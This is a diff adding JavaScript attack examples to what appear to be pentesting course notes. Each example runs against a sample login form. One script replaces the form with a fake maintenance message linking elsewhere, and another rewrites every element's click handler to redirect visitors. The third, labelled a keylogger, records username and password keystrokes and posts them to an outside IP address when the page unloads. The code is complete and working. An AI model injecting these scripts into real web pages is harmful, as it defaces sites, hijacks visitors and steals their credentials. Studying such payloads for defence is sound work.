@@ -217,6 +217,176 @@ Connection: keep-alive
 Referer: http://nix/
 ```
 
+## JS: replacing a login form with a "down for maintenance message and a redirection to another website"
+```html
+</style>
+ <form  method="post">
+  <div class="imgcontainer">
+    <img src="img_avatar2.png" alt="Avatar" class="avatar">
+  </div>
+
+  <div class="container">
+    <label for="uname"><b>Username</b></label>
+    <input type="text" placeholder="Enter Username" name="uname" required>
+
+    <label for="psw"><b>Password</b></label>
+    <input type="password" placeholder="Enter Password" name="psw" required>
+
+    <button type="submit">Login</button>
+    <label>
+      <input type="checkbox" checked="checked" name="remember"> Remember me
+    </label>
+  </div>
+  <div class="container" style="background-color:#f1f1f1">
+    <button type="button" class="cancelbtn">Cancel</button>
+    <span class="psw">Forgot <a href="#">password?</a></span>
+  </div>
+</form> 
+<script>
+  // creating h1 replacement with a message
+  var replacement = document.createElement('h1');
+  replacement.innerHTML = 'Website is down for maintenance. Please visit ';
+
+  // creating an anchor with a link
+  var anchor = document.createElement('a');
+  anchor.setAttribute('href','https://www.SecurityTube.net');
+  anchor.innerHTML = 'SecurityTube.net'
+
+  // adding the anchor as a child to the h1 element
+  replacement.appendChild(anchor);
+
+  // removing the last div, the login button
+  document.getElementsByTagName('div')[2].remove();
+  document.getElementsByTagName('button')[0].remove();
+
+  // adding the maintenance message to the main div
+  document.getElementsByTagName('div')[1].appendChild(replacement);
+
+  // removing all labels and inputs
+  const labels = document.querySelectorAll('label');
+  labels.forEach(label => {label.remove();})
+
+  const inputs = document.querySelectorAll('input');
+  inputs.forEach(input => {input.remove();})
+</script>
+</html>
+```
+### another solution: creating a replacement div with all the needed components before remove the last 2 divs
+```javascript
+var replacement_div = document.createElement('div');
+
+var replacement_msg = document.createElement('h1');
+replacement_msg.innerHTML = 'Website is down for maintenance. Please visit ';
+
+replacement_div.appendChild(replacement_msg);
+
+var anchor = document.createElement('a');
+anchor.setAttribute('href','https://www.SecurityTube.net');
+anchor.innerHTML = 'SecurityTube.net'
+replacement_msg.appendChild(anchor);
+
+document.getElementsByTagName('div')[1].remove();
+document.getElementsByTagName('div')[1].remove();
+
+document.forms[0].appendChild(replacement_div);
+```
+
+## JS: making every element redirect to a website
+```html
+<html>
+ <form  method="post">
+  <div class="imgcontainer">
+    <img src="img_avatar2.png" alt="Avatar" class="avatar">
+  </div>
+
+  <div class="container">
+    <label for="uname"><b>Username</b></label>
+    <input type="text" placeholder="Enter Username" name="uname" required>
+
+    <label for="psw"><b>Password</b></label>
+    <input type="password" placeholder="Enter Password" name="psw" required>
+
+    <button type="submit">Login</button>
+    <label>
+      <input type="checkbox" checked="checked" name="remember"> Remember me
+    </label>
+  </div>
+  <div class="container" style="background-color:#f1f1f1">
+    <button type="button" class="cancelbtn">Cancel</button>
+    <span class="psw">Forgot <a href="#">password?</a></span>
+  </div>
+</form> 
+<script>
+  function CaughtClick(tagName) {
+    alert("Got your ass for clicking on the " + tagName.toLowerCase() + " element :D");
+    location.href = 'https://www.pentesteracademy.com';
+  }
+
+  // this works only for when the elements within the body are clicked. any element outside won't trigger
+  // document.body.addEventListener('click', CaughtClick, true);
+
+  const elements = document.getElementsByTagName("*");
+  for (var i = 0 ; i < elements.length ; i++){
+    elements[i].setAttribute("onclick","CaughtClick(this.tagName);");
+  }
+</script>
+</html>
+```
+
+## JS keylogger
+```
+<html>
+ <form  method="post">
+  <div class="imgcontainer">
+    <img src="img_avatar2.png" alt="Avatar" class="avatar">
+  </div>
+
+  <div class="container">
+    <label for="uname"><b>Username</b></label>
+    <input type="text" placeholder="Enter Username" name="uname" required>
+
+    <label for="psw"><b>Password</b></label>
+    <input type="password" placeholder="Enter Password" name="psw" required>
+
+    <button type="submit">Login</button>
+    <label>
+      <input type="checkbox" checked="checked" name="remember"> Remember me
+    </label>
+  </div>
+  <div class="container" style="background-color:#f1f1f1">
+    <button type="button" class="cancelbtn">Cancel</button>
+    <span class="psw">Forgot <a href="#">password?</a></span>
+  </div>
+</form> 
+<script>
+  var username_field_input = "";
+  document.getElementsByTagName('input')[0].onkeypress = function(evt) {
+    evt = evt || window.event;
+    var charCode = evt.keyCode || evt.which;
+    var charStr = String.fromCharCode(charCode);
+    username_field_input += charStr;
+    //alert(charStr);
+  };
+
+  var password_field_input = "";
+  document.getElementsByTagName('input')[1].onkeypress = function(evt) {
+    evt = evt || window.event;
+    var charCode = evt.keyCode || evt.which;
+    var charStr = String.fromCharCode(charCode);
+    password_field_input += charStr;
+    //alert(charStr);
+  };
+
+  window.onbeforeunload = function() {
+    const xhttp = new XMLHttpRequest();
+    xhttp.open("post","http://20.20.20.129", false);
+    xhttp.send("LoggedKeyStrokesUsername="+username_field_input+"&LoggedKeyStrokesPassword="+password_field_input);
+  };
+</script>
+</html>
+```
+
+---
 
 ## HTML DOM Events List
 [W3Schools](https://www.w3schools.com/jsref/dom_obj_event.asp)
